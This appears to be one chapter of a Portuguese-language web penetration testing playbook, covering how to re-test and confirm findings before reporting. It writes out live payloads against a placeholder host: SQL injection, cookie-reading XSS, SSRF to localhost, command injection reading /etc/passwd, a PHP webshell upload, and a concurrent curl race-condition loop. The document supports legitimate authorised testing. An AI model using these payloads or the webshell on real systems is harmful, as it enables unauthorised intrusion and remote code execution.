# Fase 11: Validação de Vulnerabilidades

**Tempo estimado:** 30-45 minutos
**Objetivo:** Confirmar CADA vulnerabilidade encontrada nas fases anteriores, reproduzir o exploit e documentar evidências claras. NADA vai para o relatório sem ser validado.
**Por quê:** Falsos positivos destroem a credibilidade de um teste. Se você reporta uma vulnerabilidade que não existe, o cliente perde confiança. Esta fase elimina falsos positivos e confirma o impacto real.

---

### Passo 11.1 — Revisar Todos os Findings

**O que você vai fazer:** Abrir todos os arquivos de relatório gerados nas fases anteriores e listar cada vulnerabilidade encontrada.

```bash
echo "=== Findings das fases anteriores ==="
echo "Fase 3 (Injeção):"
cat relatorio/sqli-test.txt 2>/dev/null || echo "  Nenhum"
cat relatorio/ssti.txt 2>/dev/null || echo "  Nenhum"
cat relatorio/cmdi.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 4 (Cliente):"
cat relatorio/xss-reflected.txt 2>/dev/null || echo "  Nenhum"
cat relatorio/csrf.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 5 (Auth):"
cat relatorio/user-enumeration.txt 2>/dev/null || echo "  Nenhum"
cat relatorio/brute-force.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 6 (SSRF):"
cat relatorio/ssrf-test.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 7 (XXE):"
cat relatorio/xxe-test.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 8 (Upload):"
cat relatorio/upload-test.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 9 (Business):"
cat relatorio/race-transfer.txt 2>/dev/null || echo "  Nenhum"
cat relatorio/idor.txt 2>/dev/null || echo "  Nenhum"

echo "Fase 10 (Nuclei):"
cat relatorio/nuclei-criticos.txt 2>/dev/null || echo "  Nenhum"
```

Crie uma lista consolidada em `relatorio/findings-todos.txt`.

---

### Passo 11.2 — Confirmar SQL Injection

**O que você vai fazer:** Reproduzir a SQLi encontrada e confirmar que é reprodutível.

```http
GET /api/users?id=1' OR '1'='1-- HTTP/1.1
Host: target.com
```

**Checklist de confirmação:**
- [ ] Payload retorna dados extras (mais registros que o normal)
- [ ] UNION SELECT funciona para extrair dados específicos
- [ ] Dados sensíveis expostos (usuários, senhas hashes, emails)
- [ ] SQLMap confirma: `sqlmap -u "URL" --batch`

**Se NÃO reproduziu → marcar como falso positivo e remover.**

---

### Passo 11.3 — Confirmar XSS

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: target.com
```

**Checklist de confirmação:**
- [ ] Alert aparece no navegador (abrir URL no Firefox)
- [ ] Payload persiste no DOM (inspecionar com DevTools)
- [ ] Cookies podem ser capturados: `<script>alert(document.cookie)</script>`

---

### Passo 11.4 — Confirmar SSRF

```http
GET /api/fetch?url=http://127.0.0.1 HTTP/1.1
Host: target.com
```

**Checklist de confirmação:**
- [ ] Resposta do servidor interno retornada (headers, conteúdo)
- [ ] Cloud metadata acessível (se aplicável)
- [ ] Port scanning via SSRF funciona (testar portas 22, 80, 443)

---

### Passo 11.5 — Confirmar Command Injection

```http
GET /api/ping?host=127.0.0.1;id HTTP/1.1
Host: target.com
```

**Checklist de confirmação:**
- [ ] Output do comando `id` retornado (uid, gid)
- [ ] Comandos adicionais funcionam: `cat /etc/passwd`
- [ ] RCE confirmado e reproduzível

---

### Passo 11.6 — Confirmar File Upload

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/php

<?php echo system($_GET['cmd']); ?>
------boundary--
```

**Checklist de confirmação:**
- [ ] Webshell uploaded com sucesso
- [ ] Webshell acessível via URL: `https://target.com/uploads/shell.php?cmd=id`
- [ ] Comandos executam via webshell

---

### Passo 11.7 — Confirmar Race Condition

```bash
for i in {1..5}; do
  curl -s -X POST https://target.com/api/transfer \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"to":"account2","amount":1000}' &
done
wait
```

**Checklist de confirmação:**
- [ ] Múltiplos requests processados com sucesso
- [ ] Efeito colateral observado (saldo negativo, cupom reutilizado)
- [ ] Race condition reproduzível (testar 3 vezes)

---

### Passo 11.8 — Documentar Evidências

Para cada vulnerabilidade confirmada, crie um registro em `relatorio/evidencias.md`:

```markdown
## Vulnerabilidade: SQL Injection

**Endpoint:** GET /api/users?id=
**Payload:** 1' OR '1'='1--
**Evidência:**
- Response contém dados de todos os usuários (50 registros vs 1 esperado)
- UNION SELECT confirmou acesso a tabela users
- SQLMap confirmou: MySQL 5.7, database targetdb
**Severidade:** Alta
**Status:** Confirmado
**Data:** 2026-09-12
**Reproduzível:** Sim (testado 3 vezes)
```

---

### Passo 11.9 — Calcular Impacto (CVSS)

Para cada vulnerabilidade, use o CVSS calculator (https://www.first.org/cvss/calculator/):

| Vulnerabilidade | Impacto | Severidade | CVSS |
|-----------------|---------|------------|------|
| SQL Injection | Exposição de dados, RCE | Alta | 8.6 |
| XSS Reflected | Roubo de sessão, phishing | Média | 6.1 |
| SSRF | Acesso a rede interna, cloud | Alta | 8.5 |
| Command Injection | RCE completo | Crítica | 9.8 |
| File Upload | RCE via webshell | Crítica | 9.8 |
| Race Condition | Bypass de regras | Média | 5.3 |

---

### Passo 11.10 — Verificar Falsos Positivos

```bash
# Para cada finding, verificar se é falso positivo
# Critérios de falso positivo:
# - Output é comportamento esperado (não vulnerabilidade)
# - Vulnerabilidade não é reproduzível
# - Impacto é mínimo ou nulo
# - WAF/defense bloqueia o exploit na prática
```

**Se for falso positivo → remova da lista de findings e documente o motivo.**

---

## Checklist de Validação

| # | Item | Status | ☑ |
|---|------|--------|:---:|
| 1 | Todos os findings listados | `relatorio/findings-todos.txt` | [ ] |
| 2 | SQLi re-testada e confirmada | — | [ ] |
| 3 | XSS re-testado e confirmado | — | [ ] |
| 4 | SSRF re-testado e confirmado | — | [ ] |
| 5 | Command Injection re-testado | — | [ ] |
| 6 | File Upload re-testado | — | [ ] |
| 7 | Race Condition re-testada | — | [ ] |
| 8 | IDOR re-testado | — | [ ] |
| 9 | Evidências documentadas | `relatorio/evidencias.md` | [ ] |
| 10 | Impacto calculado (CVSS) | — | [ ] |
| 11 | Falsos positivos removidos | — | [ ] |

### ✅ Sinal de sucesso:
- TODAS as vulnerabilidades confirmadas e reproduzíveis
- Evidências claras documentadas com steps to reproduce
- Impacto calculado corretamente
- Falsos positivos identificados e removidos

### ❌ Se alguma vulnerabilidade não reproduziu:
- **NÃO inclua no relatório**
- Documente o motivo: "Não reproduzível em data de reteste"
- Pode ter sido corrigida pelo desenvolvedor entre o teste e a validação

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 11 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `evidencias.md` | Fase 12 (Relatório) | Base para detalhamento de cada vuln |
| `findings-todos.txt` | Fase 12 (Relatório) | Lista consolidada para o relatório |

**Se completou tudo → Avance para Fase 12** (`12-relatorio.md`)

---
